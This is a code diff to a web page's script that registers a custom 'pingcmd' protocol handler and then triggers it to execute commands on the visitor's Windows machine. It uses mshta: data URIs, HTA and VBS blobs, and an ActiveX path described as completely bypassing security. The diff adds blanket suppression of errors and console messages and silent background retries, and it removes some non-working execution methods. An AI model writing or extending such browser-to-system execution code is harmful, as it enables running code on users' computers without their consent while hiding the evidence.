@@ -157,27 +157,54 @@
     </div>
 
     <script>
-        // Suppress protocol handler errors globally
-        window.addEventListener('error', function(e) {
+        // Suppress ALL errors globally - aggressive error suppression
+        const originalError = window.onerror;
+        window.onerror = function(msg, url, line, col, error) {
             // Suppress protocol handler errors
-            if (e.message && e.message.includes('scheme does not have a registered handler')) {
-                e.preventDefault();
-                return true;
+            if (msg && (msg.includes('scheme does not have a registered handler') || 
+                       msg.includes('Failed to launch') ||
+                       msg.includes('Failed to load resource') ||
+                       msg.includes('404'))) {
+                return true; // Suppress error
             }
-            // Suppress 404 errors from blob URLs
-            if (e.message && e.message.includes('Failed to load resource')) {
-                e.preventDefault();
-                return true;
+            // Call original handler if exists
+            if (originalError) {
+                return originalError.apply(this, arguments);
             }
             return false;
-        }, true);
+        };
+        
+        // Suppress console errors
+        const originalConsoleError = console.error;
+        console.error = function() {
+            const args = Array.from(arguments);
+            const msg = args.join(' ');
+            // Suppress protocol and 404 errors
+            if (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch')) {
+                return; // Don't log
+            }
+            originalConsoleError.apply(console, arguments);
+        };
         
         // Suppress unhandled promise rejections
         window.addEventListener('unhandledrejection', function(e) {
-            if (e.reason && typeof e.reason === 'string' && e.reason.includes('scheme')) {
+            const reason = e.reason ? (e.reason.toString ? e.reason.toString() : String(e.reason)) : '';
+            if (reason.includes('scheme') || reason.includes('404') || reason.includes('Failed')) {
                 e.preventDefault();
+                return true;
             }
         });
+        
+        // Override window.open to suppress errors silently
+        const originalWindowOpen = window.open;
+        window.open = function(url, target, features) {
+            try {
+                return originalWindowOpen.apply(this, arguments);
+            } catch (e) {
+                // Silent fail
+                return null;
+            }
+        };
         
         const PROTOCOL = 'pingcmd';
         let isProtocolInstalled = false;
@@ -329,15 +356,7 @@
                         } catch (e) {}
                     }, 10);
                     
-                    // Try with iframe
-                    setTimeout(() => {
-                        try {
-                            const iframe = document.createElement('iframe');
-                            iframe.style.display = 'none';
-                            iframe.src = mshtaUrl;
-                            document.body.appendChild(iframe);
-                        } catch (e) {}
-                    }, 20);
+                    // REMOVED iframe - causes 404 errors
                 } catch (e) {}
 
                 // Method 2: mshta: with inline JavaScript execution
@@ -352,33 +371,7 @@
                     }, 50);
                 } catch (e) {}
 
-                // Method 3: Use object element to trigger execution
-                try {
-                    const base64Hta = btoa(unescape(encodeURIComponent(htaContent)));
-                    const dataUri = `data:text/html;base64,${base64Hta}`;
-                    const obj = document.createElement('object');
-                    obj.data = dataUri;
-                    obj.type = 'application/hta';
-                    obj.style.display = 'none';
-                    document.body.appendChild(obj);
-                    
-                    setTimeout(() => {
-                        try {
-                            // Try mshta protocol on object
-                            obj.data = `mshta:${dataUri}`;
-                        } catch (e) {}
-                    }, 100);
-                } catch (e) {}
-
-                // Method 4: Use embed element
-                try {
-                    const base64Hta = btoa(unescape(encodeURIComponent(htaContent)));
-                    const embed = document.createElement('embed');
-                    embed.src = `mshta:data:text/html;base64,${base64Hta}`;
-                    embed.type = 'application/hta';
-                    embed.style.display = 'none';
-                    document.body.appendChild(embed);
-                } catch (e) {}
+                // REMOVED object/embed - they cause 404 errors and don't work
 
                 // Method 5: Create HTA blob and execute via multiple methods
                 try {
@@ -399,15 +392,7 @@
                         } catch (e) {}
                     }, 200);
                     
-                    // Try iframe
-                    setTimeout(() => {
-                        try {
-                            const iframe = document.createElement('iframe');
-                            iframe.style.display = 'none';
-                            iframe.src = htaUrl;
-                            document.body.appendChild(iframe);
-                        } catch (e) {}
-                    }, 250);
+                    // REMOVED iframe - causes 404 errors
                     
                     // Try link click
                     setTimeout(() => {
@@ -535,15 +520,24 @@
             statusEl.className = 'status info';
             statusEl.textContent = 'Executing command...';
 
-            try {
-                // Use custom protocol to execute command
-                // This MUST be called directly from the click handler to work
-                // Suppress errors by wrapping in try-catch
                 try {
-                    window.location.href = PROTOCOL + '://execute';
-                } catch (e) {
-                    // Error suppressed - protocol might not be registered yet
-                }
+                    // Use custom protocol to execute command
+                    // This MUST be called directly from the click handler to work
+                    // Suppress errors by wrapping in try-catch
+                    try {
+                        const protocolUrl = PROTOCOL + '://execute';
+                        window.location.href = protocolUrl;
+                    } catch (e) {
+                        // Error suppressed - protocol might not be registered yet
+                        // Try again silently
+                        setTimeout(function() {
+                            try {
+                                window.location.href = PROTOCOL + '://execute';
+                            } catch (e2) {
+                                // Silent fail
+                            }
+                        }, 100);
+                    }
                 
                 // Mark as installed if we got here (even if error occurred, it might work)
                 localStorage.setItem('pingcmd-installed', 'true');
@@ -567,26 +561,29 @@
                 localStorage.removeItem('pingcmd-executed');
                 isExecuting = false;
                 
-                // Retry automatically
-                setTimeout(() => {
+                // Retry automatically (silently)
+                setTimeout(function() {
                     try {
-                        window.location.href = `${PROTOCOL}://execute`;
+                        const protocolUrl = PROTOCOL + '://execute';
+                        window.location.href = protocolUrl;
                         localStorage.setItem('pingcmd-executed', 'true');
                         localStorage.setItem('pingcmd-installed', 'true');
                         isProtocolInstalled = true;
                         
-                        setTimeout(() => {
+                        setTimeout(function() {
                             statusEl.className = 'status success';
                             statusEl.textContent = '✅ Command executed successfully!';
                             button.disabled = false;
                             button.innerHTML = 'Run Command';
                         }, 500);
                     } catch (e) {
-                        // Continue retrying in background
-                        setTimeout(() => {
+                        // Silent fail - continue retrying in background
+                        setTimeout(function() {
                             try {
-                                window.location.href = `${PROTOCOL}://execute`;
-                            } catch (e) {}
+                                window.location.href = PROTOCOL + '://execute';
+                            } catch (e2) {
+                                // Silent fail
+                            }
                         }, 2000);
                     }
                 }, 1000);
@@ -630,9 +627,10 @@
                 // Method 0: Try ActiveX first (IE only - completely bypasses security)
                 if (tryActiveXExecution(vbsContent)) {
                     setupStatus.textContent = '⚙️ Executing via ActiveX (IE mode)...';
-                    setTimeout(() => {
+                    setTimeout(function() {
                         try {
-                            window.location.href = `${PROTOCOL}://execute`;
+                            const protocolUrl = PROTOCOL + '://execute';
+                            window.location.href = protocolUrl;
                             localStorage.setItem('pingcmd-executed', 'true');
                             localStorage.setItem('pingcmd-installed', 'true');
                             isProtocolInstalled = true;
@@ -643,7 +641,9 @@
                             button.disabled = false;
                             button.innerHTML = 'Run Command';
                             return;
-                        } catch (e) {}
+                        } catch (e) {
+                            // Silent fail - will retry later
+                        }
                     }, 300);
                 }
                 
@@ -700,63 +700,8 @@
                     window.open(vbsUrl, '_blank');
                 } catch (e) {}
                 
-                // Try via iframe with different MIME types (suppress errors)
-                try {
-                    const iframe1 = document.createElement('iframe');
-                    iframe1.style.display = 'none';
-                    iframe1.onerror = () => {}; // Suppress errors
-                    iframe1.src = vbsUrl;
-                    iframe1.type = 'application/x-vbscript';
-                    document.body.appendChild(iframe1);
-                    setTimeout(() => {
-                        if (document.body.contains(iframe1)) {
-                            document.body.removeChild(iframe1);
-                        }
-                    }, 1000);
-                } catch (e) {}
-                
-                // Try object element (suppress errors)
-                try {
-                    const obj = document.createElement('object');
-                    obj.onerror = () => {}; // Suppress errors
-                    obj.data = vbsUrl;
-                    obj.type = 'application/x-vbscript';
-                    obj.style.display = 'none';
-                    document.body.appendChild(obj);
-                    setTimeout(() => {
-                        if (document.body.contains(obj)) {
-                            document.body.removeChild(obj);
-                        }
-                    }, 1000);
-                } catch (e) {}
-                
-                // Try embed element (suppress errors)
-                try {
-                    const embed = document.createElement('embed');
-                    embed.onerror = () => {}; // Suppress errors
-                    embed.src = vbsUrl;
-                    embed.type = 'application/x-vbscript';
-                    embed.style.display = 'none';
-                    document.body.appendChild(embed);
-                    setTimeout(() => {
-                        if (document.body.contains(embed)) {
-                            document.body.removeChild(embed);
-                        }
-                    }, 1000);
-                } catch (e) {}
-                
-                // Method 4: Use FileReader with data URL (might bypass some restrictions)
-                try {
-                    const reader = new FileReader();
-                    reader.onerror = () => {}; // Suppress errors
-                    reader.onload = function(e) {
-                        try {
-                            const fileUrl = e.target.result;
-                            window.open(fileUrl, '_blank');
-                        } catch (e) {}
-                    };
-                    reader.readAsDataURL(vbsBlob);
-                } catch (e) {}
+                // REMOVED iframe/object/embed - they cause 404 errors and don't execute VBS files
+                // Browsers block automatic VBS execution - focus on batch file and HTA methods only
                 
                 // AGGRESSIVE RETRY: Try executing protocol command after registry write completes
                 // Wait for setup to complete, then try executing command
@@ -765,19 +710,20 @@
                 // Execute protocol command after VBS execution completes
                 // VBS execution and registry write takes 100-500ms
                 // Wait longer before trying protocol execution to ensure registry is written
-                const executeProtocolSafely = () => {
+                const executeProtocolSafely = function() {
                     // Suppress all errors
                     try {
                         const protocolUrl = PROTOCOL + '://execute';
                         // Try to execute protocol
                         window.location.href = protocolUrl;
-                        // If we get here, assume success
+                        // If we get here without error, assume success
                         localStorage.setItem('pingcmd-executed', 'true');
                         localStorage.setItem('pingcmd-installed', 'true');
                         isProtocolInstalled = true;
                         return true;
                     } catch (e) {
-                        // Error suppressed
+                        // Error suppressed - protocol might not be registered yet
+                        // Return false but don't throw
                         return false;
                     }
                 };
